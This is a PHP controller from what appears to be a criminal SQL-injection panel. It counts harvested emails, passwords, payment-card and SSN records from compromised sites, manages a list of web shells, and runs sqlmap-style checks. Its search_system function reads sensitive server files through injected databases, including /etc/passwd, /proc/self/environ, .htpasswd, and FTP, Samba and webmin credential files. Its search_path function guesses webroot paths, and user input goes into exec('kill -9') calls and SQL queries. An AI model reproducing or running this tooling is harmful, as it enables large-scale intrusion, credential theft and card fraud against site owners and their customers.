		$shag77 = file_get_contents($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/down_email.txt');
		if ((strlen($shag77) == 0) || !(file_exists($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/down_email.txt'))) {
			$shag77 = '0 мыл(уник)';
		}


		$this->set('shag77', $shag77);
		$st = $this->Post->query('SELECT * FROM `starts`');
		$st3 = $this->Post->query('SELECT * FROM `multis` WHERE `get`=1');
		$st3_one = $this->Post->query('SELECT * FROM `multis_one` WHERE `get`=1');
		$this->set('starts', $st);
		$this->set('starts3', $st3);
		$this->set('starts3_one', $st3_one);
	}

	public function mailinfo2()
	{
		$this->timeStart = $this->start('stata_main', 1);
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo', 511);
		$usp = $this->Post->query('SELECT count(*) as `count` FROM ' . "\t" . '`posts` WHERE `status`=3');
		$tmp = $usp[0][0]['count'];
		$usp_tmp = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp.txt';
		file_put_contents($usp_tmp, $tmp);
		$usp2 = $this->Post->query('SELECT count(*) as `count` FROM `fileds`');
		$tmp2 = $usp2[0][0]['count'];
		$usp_tmp2 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp2.txt';
		file_put_contents($usp_tmp2, $tmp2);
		$usp3 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `order` !=\'0\' AND `order` !=\':\' AND `status`=3');
		$tmp3 = $usp3[0][0]['count'];
		$usp_tmp3 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp3.txt';
		file_put_contents($usp_tmp3, $tmp3);
		$usp4 = $this->Post->query('SELECT count(*) as `count` FROM `orders`');
		$tmp4 = $usp4[0][0]['count'];
		$usp_tmp4 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp4.txt';
		file_put_contents($usp_tmp4, $tmp4);
		$usp44 = $this->Post->query('SELECT count(*) as `count` FROM `ssn`');
		$tmp44 = $usp44[0][0]['count'];
		$usp_tmp44 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/usp44.txt';
		file_put_contents($usp_tmp44, $tmp44);
		$mat = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=2');
		$tmp5 = $mat[0][0]['count'];
		$usp_tmp5 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/mat.txt';
		file_put_contents($usp_tmp5, $tmp5);
		$shlak = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=1');
		$tmp6 = $shlak[0][0]['count'];
		$usp_tmp6 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shlak.txt';
		file_put_contents($usp_tmp6, $tmp6);
		$shlak2 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=0 AND `sqlmap_check`=0');
		$tmp7 = $shlak2[0][0]['count'];
		$usp_tmp7 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shlak2.txt';
		file_put_contents($usp_tmp7, $tmp7);

		if ($this->sqlmap_check) {
			$countpost = $this->Post->query('SELECT count(*) as `count` FROM  `posts` WHERE  `status` =0 AND `sqlmap_check`=0');
		}
		 else {
			$countpost = $this->Post->query('SELECT count(*) as `count` FROM  `posts` WHERE  `status` =0');
		}

		$tmp2 = $countpost[0][0]['count'] . ' шт ';
		$shag1 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1.txt';
		file_put_contents($shag1, $tmp2);
		$countpost222 = $this->Post->query('SELECT count(*) as `count` FROM  `posts` WHERE  `sqlmap_check`=1');
		$tmp2_sql = $countpost222[0][0]['count'] . ' шт ';
		$shag1_sql = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1_sql.txt';
		file_put_contents($shag1_sql, $tmp2_sql);
		$countpost222_2 = $this->Post->query('SELECT count(*) as `count` FROM  `posts` WHERE  `sqlmap_check`=2');
		$tmp2_sql_2 = $countpost222_2[0][0]['count'] . ' шт ';
		$shag1_sql_2 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1_sql_2.txt';
		file_put_contents($shag1_sql_2, $tmp2_sql_2);
		$countpost22 = $this->Post->query('SELECT count(*) as `count` FROM  `posts` WHERE  `status` =0 AND get_type=\'asp\'');
		$tmp222 = $countpost22[0][0]['count'] . ' шт ';
		$shag1_22 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag1_22.txt';
		file_put_contents($shag1_22, $tmp222);
		$urls = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=2 AND `prohod`<5');
		$tmp2 = $urls[0][0]['count'] . ' шт ';
		$shag2 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag2.txt';
		file_put_contents($shag2, $tmp2);
		$urls_22 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=2 AND `prohod`<5 AND get_type=\'asp\'');
		$tmp2_22 = $urls[0][0]['count'] . ' шт ';
		$shag2_22 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag2_22.txt';
		file_put_contents($shag2_22, $tmp2_22);
		$urls = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `getmail`=0  AND `version` LIKE  \'%5.%\'');
		$tmp2 = $urls[0][0]['count'] . ' шт ';
		$shag3 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag3.txt';
		file_put_contents($shag3, $tmp2);
		$urls = $this->Post->query('SELECT count(*) as `count` FROM `fileds` WHERE `password`=\'\' AND `get`=0');
		$tmp2 = $urls[0][0]['count'] . ' шт ';
		$shag4 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4.txt';
		file_put_contents($shag4, $tmp2);
		$urls = $this->Post->query('SELECT count(*) as `count` FROM `fileds` WHERE `name`=\'\' AND `get`=0');
		$tmp44 = $urls[0][0]['count'] . ' шт ';
		$shag444 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag444.txt';
		file_put_contents($shag444, $tmp44);
		$urls5555_1 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `order_check` =0 AND `version` LIKE  \'%5.%\'');
		$urls5555_2 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `order_check` =1 AND `version` LIKE  \'%5.%\'');
		$tmp2 = $urls5555_1[0][0]['count'] . '/' . $urls5555_2[0][0]['count'] . ' шт ';
		$shag400 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag400.txt';
		file_put_contents($shag400, $tmp2);
		$urls5555_11 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `order_check` =0 AND `version` LIKE  \'M%\'');
		$urls5555_22 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `order_check` =1 AND `version` LIKE  \'M%\'');
		$tmp222 = $urls5555_11[0][0]['count'] . '/' . $urls5555_22[0][0]['count'] . ' шт ';
		$shag4000 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4000.txt';
		file_put_contents($shag4000, $tmp222);
		$urls5555_15 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =0 AND `version` LIKE  \'%5.%\'');
		$urls5555_25 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =1 AND `version` LIKE  \'%5.%\'');
		$tmp2 = $urls5555_15[0][0]['count'] . '/' . $urls5555_25[0][0]['count'] . ' шт ';
		$shag4005 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4005.txt';
		file_put_contents($shag4005, $tmp2);
		$urls5555_155 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =0 AND `version` LIKE  \'M%\'');
		$urls5555_255 = $this->Post->query('SELECT count(*) as `count` FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =1 AND `version` LIKE  \'M%\'');
		$tmp2 = $urls5555_155[0][0]['count'] . '/' . $urls5555_255[0][0]['count'] . ' шт ';
		$shag4006 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/shag4006.txt';
		file_put_contents($shag4006, $tmp2);
		$urls = $this->Post->query('SELECT count(*) as `count` FROM `fileds` WHERE `password` =\':\' and `get`=0');
		$urlss = $this->Post->query('SELECT sum(count) as `count` FROM `fileds` WHERE `password` =\':\' and `get`=0');
		$tmp1 = $urls[0][0]['count'] . ' шт ' . $urlss[0][0]['count'] . ' мыл';
		$naideno_email = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/naideno_email.txt';
		file_put_contents($naideno_email, $tmp1);
		$urls = $this->Post->query('SELECT count(*) as `count` FROM `fileds` WHERE `name` !=\':\' and `get`=0');
		$urlss = $this->Post->query('SELECT sum(count) as `count` FROM `fileds` WHERE `name` !=\':\' and `get`=0');
		$tmp11 = $urls[0][0]['count'] . ' шт ' . $urlss[0][0]['count'] . ' мыл';
		$naideno_email_name = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/naideno_email_name.txt';
		file_put_contents($naideno_email_name, $tmp11);
		$urls = $this->Post->query('SELECT count(*) as `count` FROM `fileds` WHERE `password` !=\'\' and `password` !=\':\' and `get`=0');
		$urlss = $this->Post->query('SELECT sum(count) as `count` FROM `fileds` WHERE `password` !=\'\' and `password` !=\':\' and `get`=0');
		$tmp2 = $urls[0][0]['count'] . ' шт ' . $urlss[0][0]['count'] . ' мыл';
		$naideno_email_pass = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/naideno_email_pass.txt';
		file_put_contents($naideno_email_pass, $tmp2);
		$countall = $this->Post->query('SELECT count(*) FROM `mails`');
		$tmp3 = $countall[0][0]['count(*)'] . ' мыл(уник)';
		$down_email_pass = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/down_email_pass.txt';
		file_put_contents($down_email_pass, $tmp3);
		$countall2 = $this->Post->query('SELECT count(*) FROM `mails_one`');
		$tmp4 = $countall2[0][0]['count(*)'] . ' мыл(уник)';
		$down_email = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/mailinfo/down_email.txt';
		file_put_contents($down_email, $tmp4);
		$this->stop();
		$this->redirect(array('action' => 'mailinfo'));
		exit();
	}

	public function dumping_all()
	{
		if ($this->params['form']['update33']) {
			$id = $this->params['form']['id3'];
			$limit = $this->params['form']['limit'];
			$dok = $this->params['form']['dok'];
			$filed_id = $this->params['form']['filed_id'];
			$status = $this->params['form']['st3_one'];
			$pid = $this->params['form']['pid'];
			$this->logs('kill -9 ' . $pid, 'dumping_all');
			$this->Filed->query('DELETE FROM `starts` WHERE `pid` = ' . $pid);
			$this->d($id);
			$this->d($status);
			$this->d($status);

			if ($pid == 0) {
				echo 'PID!!! = ' . $pid;
			}
			 else {
				exec('kill -9 ' . $pid);
			}

			if (($status == 4) || ($status == '4')) {
				if ($this->Filed->query('DELETE FROM `multis_one` WHERE `id` = ' . $id . '.')) {
					$this->d('udalen uspeshno');
				}


				exit();
			}


			$this->Post->query('UPDATE  `multis_one` SET  `get` = ' . $status . ',`dok`=' . $dok
                . ',`lastlimit`=' . $limit . ' WHERE  `id` =' . $id);
			$this->Post->query('UPDATE  `fileds_one` SET  `potok` = 0 WHERE  `id` =' . $filed_id);
			if (($status == 3) || ($status == '3')) {
				if ($this->Post->query('UPDATE  `fileds_one` SET  `get` = \'1\',`multi`=1 WHERE  `id` =' . $filed_id)) {
					$this->d('peresapuhen');
				}
				 else {
					$this->d('NE peresapuhen');
					$this->d('UPDATE  `fileds_one` SET  `get` = \'1\',`multi`=1 WHERE  `id` =' . $filed_id);
				}
			}

		}


		$st3_one = $this->Post->query('SELECT * FROM `multis_one`');
		$this->set('starts3_one', $st3_one);
	}

	public function index($stat = 3)
	{
		$conditions = array('status' => intval($stat));
		$data = $this->paginate('Post', $conditions);
		$this->set('data', $data);
	}

	public function index2()
	{
		$conditions = array('status' => intval(2), 'prohod' => 5);
		$data = $this->paginate('Post', $conditions);
		$this->set('data', $data);
	}

	public function index3()
	{
		$this->s();

		if ($this->params['pass'][1] == '') {
			$st = 1;
		}
		 else {
			$st = $this->params['pass'][1];
		}

		$st = $st - 1;
		$limit = $st * 500;
		$limit = $limit . ',500';

		if ($this->params['pass'][0] == 'id') {
			$data = $this->Post->query('SELECT * FROM  `posts_all` WHERE `status`=2 or `status`=3 order by id DESC limit ' . $limit);
		}
		 else if ($this->params['pass'][0] == 'date') {
			$data = $this->Post->query('SELECT * FROM  `posts_all` WHERE `status`=2 or `status`=3 order by date DESC limit ' . $limit);
		}
		 else {
			$data = $this->Post->query('SELECT * FROM  `posts_all` WHERE `status`=2 or `status`=3 order by domen DESC limit ' . $limit);
		}

		$data222 = $this->Post->query('SELECT count(*) FROM  `posts_all` WHERE `status`=2 or `status`=3 order by id DESC');
		$this->params['pass'][10] = $data222[0][0]['count(*)'];
		$this->set('data', $data);
	}

	public function order_count()
	{
		$this->s();

		if ($this->params['pass'][1] == '') {
			$st = 1;
		}
		 else {
			$st = $this->params['pass'][1];
		}

		$st = $st - 1;
		$limit = $st * 500;
		$limit = $limit . ',500';

		if ($this->params['pass'][0] == 'id') {
			$data = $this->Post->query('SELECT * FROM  `orders` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by id DESC limit ' . $limit);
		}
		 else if ($this->params['pass'][0] == 'date') {
			$data = $this->Post->query('SELECT * FROM  `orders` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by date DESC limit ' . $limit);
		}
		 else if ($this->params['pass'][0] == 'count') {
			$data = $this->Post->query('SELECT * FROM  `orders` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by count DESC limit ' . $limit);
		}
		 else if ($this->params['pass'][0] == 'new') {
			$data = $this->Post->query('SELECT * FROM  `orders` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by count_new  DESC limit ' . $limit);
		}
		 else if ($this->params['pass'][0] == 'new2') {
			$data = $this->Post->query('SELECT * FROM  `orders` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by count_new2 DESC limit ' . $limit);
		}
		 else {
			$data = $this->Post->query('SELECT * FROM  `orders` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by count DESC limit ' . $limit);
		}

		$data222 = $this->Post->query('SELECT count(*) FROM  `orders` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by count DESC');
		$this->params['pass'][10] = $data222[0][0]['count(*)'];
		$p = array();
		$i = 1;

		foreach ($data as $d ) {
			$post_id = $d['orders']['post_id'];
			$order_id = $d['orders']['id'];
			$p[$i]['post_id'][] = $d['orders']['post_id'];
			$p[$i]['id'][] = $d['orders']['id'];
			$p[$i]['bd'][] = $d['orders']['bd'];
			$p[$i]['table'][] = $d['orders']['table'];
			$p[$i]['column'][] = $d['orders']['column'];
			$p[$i]['shema'][] = $d['orders']['shema'];
			$p[$i]['count'][] = $d['orders']['count'];
			$p[$i]['count_new'][] = $d['orders']['count_new'];
			$p[$i]['count_new2'][] = $d['orders']['count_new2'];
			$p[$i]['count_n'][] = $d['orders']['count_n'];
			$p[$i]['domen'][] = $d['orders']['domen'];
			$p[$i]['column_16'][] = $d['orders']['column_16'];
			$p[$i]['date'][] = $d['orders']['date'];
			$p[$i]['date_new'][] = $d['orders']['date_new'];
			$p[$i]['color'][] = $d['orders']['color'];
			$g2 = $this->Post->query('SELECT * FROM  `orders_card` WHERE order_id=' . $order_id . '');
			$g3 = $this->Post->query('SELECT * FROM  `posts` WHERE id=' . $post_id);

			foreach ($g2 as $g23 ) {
				$p[$i]['orders_card'][] = $g23['orders_card'];
			}

			$p[$i]['url'][] = $g3[0]['posts']['url'];
			$p[$i]['alexa'][] = $g3[0]['posts']['alexa'];
			$p[$i]['pr'][] = $g3[0]['posts']['pr'];
			$p[$i]['country'][] = $g3[0]['posts']['country'];
			++$i;
		}

		$this->set('data', $p);
	}

	public function ssn_count()
	{
		$this->s();

		if ($this->params['pass'][1] == '') {
			$st = 1;
		}
		 else {
			$st = $this->params['pass'][1];
		}

		$st = $st - 1;
		$limit = $st * 500;
		$limit = $limit . ',500';

		if ($this->params['pass'][0] == 'id') {
			$data = $this->Post->query('SELECT * FROM  `ssn` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by id DESC limit ' . $limit);
		}
		 else if ($this->params['pass'][0] == 'date') {
			$data = $this->Post->query('SELECT * FROM  `ssn` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by date DESC limit ' . $limit);
		}
		 else if ($this->params['pass'][0] == 'count') {
			$data = $this->Post->query('SELECT * FROM  `ssn` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by count DESC limit ' . $limit);
		}
		 else if ($this->params['pass'][0] == 'new') {
			$data = $this->Post->query('SELECT * FROM  `ssn` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by count_new  DESC limit ' . $limit);
		}
		 else if ($this->params['pass'][0] == 'new2') {
			$data = $this->Post->query('SELECT * FROM  `ssn` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by count_new2 DESC limit ' . $limit);
		}
		 else {
			$data = $this->Post->query('SELECT * FROM  `ssn` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by count DESC limit ' . $limit);
		}

		$data222 = $this->Post->query('SELECT count(*) FROM  `ssn` WHERE `bd` !=\'\' AND `table` !=\'\' AND `column` !=\'\' order by count DESC');
		$this->params['pass'][10] = $data222[0][0]['count(*)'];
		$p = array();
		$i = 1;

		foreach ($data as $d ) {
			$post_id = $d['ssn']['post_id'];
			$order_id = $d['ssn']['id'];
			$p[$i]['post_id'][] = $d['ssn']['post_id'];
			$p[$i]['id'][] = $d['ssn']['id'];
			$p[$i]['bd'][] = $d['ssn']['bd'];
			$p[$i]['table'][] = $d['ssn']['table'];
			$p[$i]['column'][] = $d['ssn']['column'];
			$p[$i]['shema'][] = $d['ssn']['shema'];
			$p[$i]['count'][] = $d['ssn']['count'];
			$p[$i]['count_new'][] = $d['ssn']['count_new'];
			$p[$i]['count_new2'][] = $d['ssn']['count_new2'];
			$p[$i]['count_n'][] = $d['ssn']['count_n'];
			$p[$i]['domen'][] = $d['ssn']['domen'];
			$p[$i]['column_16'][] = $d['ssn']['column_16'];
			$p[$i]['date'][] = $d['ssn']['date'];
			$p[$i]['date_new'][] = $d['ssn']['date_new'];
			$p[$i]['color'][] = $d['ssn']['color'];
			$g2 = $this->Post->query('SELECT * FROM  `ssn_card` WHERE order_id=' . $order_id . '');
			$g3 = $this->Post->query('SELECT * FROM  `posts` WHERE id=' . $post_id);

			foreach ($g2 as $g23 ) {
				$p[$i]['ssn_card'][] = $g23['ssn_card'];
			}

			$p[$i]['url'][] = $g3[0]['posts']['url'];
			$p[$i]['alexa'][] = $g3[0]['posts']['alexa'];
			$p[$i]['pr'][] = $g3[0]['posts']['pr'];
			$p[$i]['country'][] = $g3[0]['posts']['country'];
			++$i;
		}

		$this->set('data', $p);
	}

	public function order_domens()
	{
		$this->s();

		if ($this->params['pass'][0] == 'id') {
			$data = $this->Post->query('SELECT * FROM  `domens` WHERE status =2 order by `id`  DESC');
		}
		 else {
			$data = $this->Post->query('SELECT * FROM  `domens` WHERE status =2 order by `id` DESC');
		}

		$p = array();
		$i = 1;

		foreach ($data as $d ) {
			$p[$i]['id'][] = $d['domens']['id'];
			$p[$i]['domen'][] = $d['domens']['domen'];
			$p[$i]['domen_new'][] = $d['domens']['domen_new'];
			$p[$i]['status'][] = $d['domens']['status'];
			$p[$i]['find'][] = $d['domens']['find'];
			$p[$i]['http'][] = $d['domens']['http'];
			$p[$i]['get_url'][] = @$d['domens']['get_url'];
			$p[$i]['post_url'][] = @$d['domens']['post_url'];
			$p[$i]['date'][] = $d['domens']['date'];
			$id = $d['domens']['id'];
			$domen = $d['domens']['domen'];
			$domen_new = $d['domens']['domen_new'];
			$g23 = $this->Post->query('SELECT * FROM  `posts_all` WHERE domen like \'%' . $domen . '\'');
			$p[$i]['links_domen'] = $g23;
			++$i;
		}

		$this->set('data', $p);
	}

	public function order_domens_bad()
	{
		$this->s();

		if ($this->params['pass'][0] == 'id') {
			$data = $this->Post->query('SELECT * FROM  `domens` WHERE `status` =1 or `bad`=1 order by `id` DESC');
		}
		 else {
			$data = $this->Post->query('SELECT * FROM  `domens` WHERE `status` =1 or `bad`=1 order by `date` DESC');
		}

		$p = array();
		$i = 1;

		foreach ($data as $d ) {
			$p[$i]['id'][] = $d['domens']['id'];
			$p[$i]['domen'][] = $d['domens']['domen'];
			$p[$i]['domen_new'][] = $d['domens']['domen_new'];
			$p[$i]['status'][] = $d['domens']['status'];
			$p[$i]['find'][] = $d['domens']['find'];
			$p[$i]['http'][] = $d['domens']['http'];
			$p[$i]['get_url'][] = $d['domens']['get_url'];
			$p[$i]['post_url'][] = $d['domens']['post_url'];
			$p[$i]['date'][] = $d['domens']['date'];
			$id = $d['domens']['id'];
			$domen = $d['domens']['domen'];
			$domen_new = $d['domens']['domen_new'];
			$g23 = $this->Post->query('SELECT * FROM  `posts_all` WHERE domen like \'%' . $domen . '\'');
			$p[$i]['links_domen'] = $g23;
			++$i;
		}

		$this->set('data', $p);
	}


	public function shelltest2()
	{
		if ($this->local_shells == true) {
			$original = file('local_shells.txt');
		}
		 else {
			$original = file('goodshelllist.txt');
		}

		$original = array_filter($original);
		shuffle($original);
		$this->serv = $original;
		$this->set('serv', $this->serv);
	}

	public function terms()
	{
		$this->set('serv', 123);
	}

	public function prav()
	{
		$this->set('serv', 123);
	}

	public function search_system($id)
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$cards = $this->cards;
		unset($data['orders']);
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];
		$domen = $squle['Post']['domen'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$card = '';
		$i = 1;
		$this->d($pass);
		$this->tableOrder = '';
		$post_id = $data['posts_one']['id'];
		$this->workup();
		$path[] = '/etc/passwd';
		$path[] = '/etc/crontab';
		$path[] = '/etc/hosts';
		$path[] = '/etc/my.cnf';
		$path[] = '/.bash_history';
		$path[] = '/.htpasswd';
		$path[] = '/.htaccess';
		$path[] = '/etc/.htpasswd';
		$path[] = '/root/.bash_history';
		$path[] = '/etc/named.conf';
		$path[] = '/proc/self/environ';
		$path[] = '/etc/php.ini';
		$path[] = '/bin/php.ini';
		$path[] = '/etc/httpd/php.ini';
		$path[] = '/usr/lib/php.ini';
		$path[] = '/usr/lib/php/php.ini';
		$path[] = '/usr/local/etc/php.ini';
		$path[] = '/usr/local/lib/php.ini';
		$path[] = '/usr/local/php/lib/php.ini';
		$path[] = '/usr/local/php4/lib/php.ini';
		$path[] = '/usr/local/php5/lib/php.ini';
		$path[] = '/usr/local/apache/conf/php.ini';
		$path[] = '/etc/php4.4/fcgi/php.ini';
		$path[] = '/etc/php4/apache/php.ini';
		$path[] = '/etc/php4/apache2/php.ini';
		$path[] = '/etc/php5/apache/php.ini';
		$path[] = '/etc/php5/apache2/php.ini';
		$path[] = '/etc/php/php.ini';
		$path[] = '/usr/local/apache/conf/modsec.conf';
		$path[] = '/var/cpanel/cpanel.config';
		$path[] = '/proc/self/environ';
		$path[] = '/proc/self/fd/2';
		$path[] = '/etc/ssh/sshd_config';
		$path[] = '/var/lib/mysql/my.cnf';
		$path[] = '/etc/mysql/my.cnf';
		$path[] = '/etc/my.cnf';
		$path[] = '/etc/logrotate.d/proftpd';
		$path[] = '/www/logs/proftpd.system.log';
		$path[] = '/var/log/proftpd';
		$path[] = '/etc/proftp.conf';
		$path[] = '/etc/protpd/proftpd.conf';
		$path[] = '/etc/vhcs2/proftpd/proftpd.conf';
		$path[] = '/etc/proftpd/modules.conf';
		$path[] = '/etc/vsftpd.chroot_list';
		$path[] = '/etc/vsftpd/vsftpd.conf';
		$path[] = '/etc/vsftpd.conf';
		$path[] = '/etc/chrootUsers';
		$path[] = '/etc/wu-ftpd/ftpaccess';
		$path[] = '/etc/wu-ftpd/ftphosts';
		$path[] = '/etc/wu-ftpd/ftpusers';
		$path[] = '/usr/sbin/pure-config.pl';
		$path[] = '/usr/etc/pure-ftpd.conf';
		$path[] = '/etc/pure-ftpd/pure-ftpd.conf';
		$path[] = '/usr/local/etc/pure-ftpd.conf';
		$path[] = '/usr/local/etc/pureftpd.pdb';
		$path[] = '/usr/local/pureftpd/etc/pureftpd.pdb';
		$path[] = '/usr/local/pureftpd/sbin/pure-config.pl';
		$path[] = '/usr/local/pureftpd/etc/pure-ftpd.conf';
		$path[] = '/etc/pure-ftpd.conf';
		$path[] = '/etc/pure-ftpd/pure-ftpd.pdb';
		$path[] = '/etc/pureftpd.pdb';
		$path[] = '/etc/pureftpd.passwd';
		$path[] = '/etc/pure-ftpd/pureftpd.pdb';
		$path[] = '/usr/ports/ftp/pure-ftpd/';
		$path[] = '/usr/ports/net/pure-ftpd/';
		$path[] = '/usr/pkgsrc/net/pureftpd/';
		$path[] = '/usr/ports/contrib/pure-ftpd/';
		$path[] = '/var/log/ftp-proxy';
		$path[] = '/etc/logrotate.d/ftp';
		$path[] = '/etc/ftpchroot';
		$path[] = '/etc/ftphosts';
		$path[] = '/etc/smbpasswd';
		$path[] = '/etc/smb.conf';
		$path[] = '/etc/samba/smb.conf';
		$path[] = '/etc/samba/samba.conf';
		$path[] = '/etc/samba/smb.conf.user';
		$path[] = '/etc/samba/smbpasswd';
		$path[] = '/etc/samba/smbusers';
		$path[] = '/var/lib/pgsql/data/postgresql.conf';
		$path[] = '/var/postgresql/db/postgresql.conf';
		$path[] = '/etc/ipfw.conf';
		$path[] = '/etc/firewall.rules';
		$path[] = '/etc/ipfw.rules';
		$path[] = '/usr/local/etc/webmin/miniserv.conf';
		$path[] = '/etc/webmin/miniserv.conf';
		$path[] = '/usr/local/etc/webmin/miniserv.users';
		$path[] = '/etc/webmin/miniserv.users';
		$path[] = '/etc/squirrelmail/config/config.php';
		$path[] = '/etc/squirrelmail/config.php';
		$path[] = '/etc/httpd/conf.d/squirrelmail.conf';
		$path[] = '/usr/share/squirrelmail/config/config.php';
		$path[] = '/private/etc/squirrelmail/config/config.php';
		$path[] = '/srv/www/htdos/squirrelmail/config/config.php';
		$this->d($path, '$path');

		foreach ($path as $conf_new2 ) {
			$load_f_new = $this->mysqlInj->load_file($conf_new2);

			if ($load_f_new != '') {
				$this->d($load_f_new, $conf_new2);
				$kk = 'yes';
			}

		}

		if ($kk != 'yes') {
			$this->d('httpd не нашел');
		}


		exit();
	}

	public function search_path($id)
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];
		$cards = $this->cards;
		unset($data['orders']);
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];

		if ($this->domen != '') {
			$domen = $this->domen;
		}
		 else {
			$domen = $squle['Post']['domen'];
		}

		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$card = '';
		$i = 1;
		$this->d($pass);
		$this->tableOrder = '';
		$post_id = $data['posts_one']['id'];

		if (($squle['Post']['path1'] != '') && ($squle['Post']['path1'] != '0')) {
			$path1 = $squle['Post']['path1'];
			$path2[] = $squle['Post']['path1'];
		}


		if (($squle['Post']['path2'] != '') && ($squle['Post']['path2'] != '0')) {
			$path2 = $squle['Post']['path2'];
			$path2[] = $squle['Post']['path2'];
		}


		if (($squle['Post']['path3'] != '') && ($squle['Post']['path3'] != '0')) {
			$path3 = $squle['Post']['path3'];
			$path2[] = $squle['Post']['path3'];
		}


		$this->workup();
		$path[] = '/data/www/' . $domen . '/';
		$path[] = '/www/' . $domen . '/';
		$path[] = '/domains/' . $domen . '/';
		$path[] = '/domains/public_html/' . $domen . '/';
		$path[] = '/public_html/' . $domen . '/';
		$path[] = '/public_html/';
		$path[] = '/' . $domen . '/';
		$path2[] = '/var/www/html/';
		$path2[] = '/var/www/html/' . $domen . '/';
		$path2[] = '/etc/httpd/';
		$path2[] = '/etc/httpd/' . $domen . '/';
		$path2[] = '/var/www/' . $domen . '/data/www/' . $domen . '/';
		$path2[] = '/home/www/user/sites/' . $domen . '/htdocs/';
		$path2[] = '/space/home/clients/websites/w_80200/' . $domen . '/public_html/';
		$path2[] = '/var/www/virtual_client/ridel-holding/www/';
		$path2[] = '/var/www/hq/data/www/' . $domen . '/';
		$path2[] = '/var/www/vhosts/' . $domen . '/httpdocs/';
		$path2[] = '/home/admin/data/www/' . $domen . '/';
		$path2[] = '/usr/local/www/apache22/data/' . $domen . '/';
		$path2[] = '/usr/local/www/lib/';
		$path2[] = '/home/users/domains/' . $domen . '/';
